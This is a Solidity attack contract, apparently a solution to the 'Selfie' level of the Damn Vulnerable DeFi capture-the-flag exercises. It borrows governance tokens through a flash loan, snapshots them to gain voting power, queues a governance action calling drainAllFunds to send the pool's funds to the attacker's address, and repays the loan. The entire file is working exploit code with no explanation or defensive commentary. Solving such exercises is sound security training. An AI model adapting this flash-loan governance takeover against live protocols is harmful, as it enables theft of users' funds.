pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract SelfieAttacker {
    ISimpleGovernance public governor;
    address public owner;

    constructor(address governor_) public {
        governor = ISimpleGovernance(governor_);
        owner = msg.sender;
    }

    function attack(ISelfiePool pool, uint256 amount) external payable{
        pool.flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot(token).snapshot();
        governor.queueAction(
            msg.sender, 
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                owner
            ),
            0
        );
        ERC20Snapshot(token).transfer(msg.sender, ERC20Snapshot(token).balanceOf(address(this)));
    }
}